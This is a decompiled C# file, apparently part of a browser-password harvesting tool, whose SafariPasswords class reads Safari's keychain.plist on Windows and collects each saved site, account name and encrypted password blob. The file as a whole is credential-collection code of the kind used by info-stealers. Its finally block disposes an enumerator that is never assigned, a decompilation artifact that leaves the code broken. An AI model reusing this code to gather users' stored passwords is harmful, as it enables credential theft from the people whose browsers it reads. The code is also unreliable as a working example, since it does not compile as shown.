using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserPasswords
{
	// Token: 0x0200004D RID: 77
	public class SafariPasswords
	{
		// Token: 0x06000210 RID: 528 RVA: 0x00008E5C File Offset: 0x0000705C
		public static IEnumerable<SafariPassword> EnumeratePasswords()
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Apple Computer\\Preferences\\keychain.plist");
			List<SafariPassword> list = new List<SafariPassword>();
			IEnumerable<SafariPassword> result;
			if (!File.Exists(path))
			{
				result = list;
			}
			else
			{
				Dictionary<string, object> dictionary = (Dictionary<string, object>)Plist.readPlist(path);
				List<string> list2 = new List<string>(dictionary.Keys);
				List<object> list3 = (List<object>)dictionary[list2[0]];
				try
				{
					foreach (object obj in list3)
					{
						Dictionary<string, object> dictionary2 = (Dictionary<string, object>)obj;
						list.Add(new SafariPassword(dictionary2["Server"].ToString(), dictionary2["Account"].ToString(), (byte[])dictionary2["Data"]));
					}
				}
				finally
				{
					List<object>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
				result = list;
			}
			return result;
		}
	}
}
